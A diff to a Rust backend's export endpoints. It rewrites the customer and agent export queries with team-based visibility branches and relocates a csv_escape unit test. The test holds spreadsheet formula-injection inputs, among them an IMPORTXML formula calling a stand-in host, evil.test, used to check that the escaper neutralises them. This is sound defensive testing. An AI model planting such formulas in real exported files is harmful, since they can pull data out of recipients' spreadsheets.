@@ -24,21 +24,38 @@ pub async fn export_customers(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthUser>,
 ) -> Result {
-    let mut clause = String::from("m.deleted_at IS NULL AND cu.deleted_at IS NULL");
-    let team_binds = store::append_visibility_clause(&mut clause, &user);
-    let sql = crate::db::pg_params(&format!(
-        "SELECT DISTINCT cu.id, cu.display_name, cu.platform, cu.platform_user_id
-         FROM messages m
-         {CONVERSATION_JOIN}
-         JOIN customers cu ON cu.id = c.customer_id
-         WHERE {clause}
-         ORDER BY cu.display_name LIMIT ?"
-    ));
-    let mut q = sqlx::query_as::<_, (i64, Option<String>, String, String)>(&sql);
-    for team_id in &team_binds {
-        q = q.bind(team_id);
-    }
-    let rows = q.bind(EXPORT_FILTER_CAP).fetch_all(&state.db).await?;
+    let rows: Vec<(i64, Option<String>, String, String)> = if user.is_admin() {
+        sqlx::query_as(
+            "SELECT id, display_name, platform, platform_user_id
+             FROM customers
+             WHERE deleted_at IS NULL
+             ORDER BY display_name LIMIT $1",
+        )
+        .bind(EXPORT_FILTER_CAP)
+        .fetch_all(&state.db)
+        .await?
+    } else if let Some(team_id) = user.primary_team_id {
+        sqlx::query_as(
+            "SELECT id, display_name, platform, platform_user_id
+             FROM customers
+             WHERE deleted_at IS NULL AND (source_team_id IS NULL OR source_team_id = $1)
+             ORDER BY display_name LIMIT $2",
+        )
+        .bind(team_id)
+        .bind(EXPORT_FILTER_CAP)
+        .fetch_all(&state.db)
+        .await?
+    } else {
+        sqlx::query_as(
+            "SELECT id, display_name, platform, platform_user_id
+             FROM customers
+             WHERE deleted_at IS NULL AND source_team_id IS NULL
+             ORDER BY display_name LIMIT $1",
+        )
+        .bind(EXPORT_FILTER_CAP)
+        .fetch_all(&state.db)
+        .await?
+    };
     let data: Vec<Value> = rows
         .iter()
         .map(|(id, name, platform, puid)| {
@@ -52,22 +69,41 @@ pub async fn export_agents(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthUser>,
 ) -> Result {
-    let mut clause =
-        String::from("m.deleted_at IS NULL AND a.deleted_at IS NULL AND a.is_active = 1");
-    let team_binds = store::append_visibility_clause(&mut clause, &user);
-    let sql = crate::db::pg_params(&format!(
-        "SELECT DISTINCT a.id, a.display_name, a.role
-         FROM messages m
-         {CONVERSATION_JOIN}
-         JOIN agents a ON a.id = m.agent_id
-         WHERE {clause}
-         ORDER BY a.display_name LIMIT ?"
-    ));
-    let mut q = sqlx::query_as::<_, (String, String, String)>(&sql);
-    for team_id in &team_binds {
-        q = q.bind(team_id);
-    }
-    let rows = q.bind(EXPORT_FILTER_CAP).fetch_all(&state.db).await?;
+    let rows: Vec<(String, String, String)> = if user.is_admin() {
+        sqlx::query_as(
+            "SELECT id, display_name, role
+             FROM agents
+             WHERE deleted_at IS NULL AND is_active = 1
+             ORDER BY display_name LIMIT $1",
+        )
+        .bind(EXPORT_FILTER_CAP)
+        .fetch_all(&state.db)
+        .await?
+    } else {
+        let team_ids: Vec<i64> = user.teams.iter().map(|team| team.team_id).collect();
+        if team_ids.is_empty() {
+            Vec::new()
+        } else {
+            let placeholders = (1..=team_ids.len())
+                .map(|idx| format!("${idx}"))
+                .collect::<Vec<_>>()
+                .join(", ");
+            let limit_param = team_ids.len() + 1;
+            let sql = format!(
+                "SELECT DISTINCT a.id, a.display_name, a.role
+                 FROM agents a
+                 JOIN team_members tm ON tm.agent_id = a.id
+                 WHERE a.deleted_at IS NULL AND a.is_active = 1
+                   AND tm.team_id IN ({placeholders})
+                 ORDER BY a.display_name LIMIT ${limit_param}"
+            );
+            let mut q = sqlx::query_as::<_, (String, String, String)>(&sql);
+            for team_id in team_ids {
+                q = q.bind(team_id);
+            }
+            q.bind(EXPORT_FILTER_CAP).fetch_all(&state.db).await?
+        }
+    };
     let data: Vec<Value> = rows
         .iter()
         .map(|(id, name, role)| json!({ "id": id, "displayName": name, "role": role }))
@@ -156,25 +192,6 @@ fn csv_escape(field: &str) -> String {
         format!("\"{}\"", field.replace('"', "\"\""))
     } else {
         field.to_string()
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::csv_escape;
-
-    #[test]
-    fn csv_escape_neutralizes_spreadsheet_formulas() {
-        assert_eq!(
-            csv_escape("=IMPORTXML(\"https://evil.test\")"),
-            "\"'=IMPORTXML(\"\"https://evil.test\"\")\""
-        );
-        assert_eq!(csv_escape("+cmd"), "'+cmd");
-        assert_eq!(csv_escape("-2+3"), "'-2+3");
-        assert_eq!(csv_escape("@SUM(1,2)"), "\"'@SUM(1,2)\"");
-        assert_eq!(csv_escape("  =SUM(1,2)"), "\"'  =SUM(1,2)\"");
-        assert_eq!(csv_escape("\r=SUM(1,2)"), "\"'\r=SUM(1,2)\"");
-        assert_eq!(csv_escape("normal text"), "normal text");
     }
 }
 
@@ -323,5 +340,24 @@ pub async fn export_messages(
             )
                 .into_response())
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::csv_escape;
+
+    #[test]
+    fn csv_escape_neutralizes_spreadsheet_formulas() {
+        assert_eq!(
+            csv_escape("=IMPORTXML(\"https://evil.test\")"),
+            "\"'=IMPORTXML(\"\"https://evil.test\"\")\""
+        );
+        assert_eq!(csv_escape("+cmd"), "'+cmd");
+        assert_eq!(csv_escape("-2+3"), "'-2+3");
+        assert_eq!(csv_escape("@SUM(1,2)"), "\"'@SUM(1,2)\"");
+        assert_eq!(csv_escape("  =SUM(1,2)"), "\"'  =SUM(1,2)\"");
+        assert_eq!(csv_escape("\r=SUM(1,2)"), "\"'\r=SUM(1,2)\"");
+        assert_eq!(csv_escape("normal text"), "normal text");
     }
 }
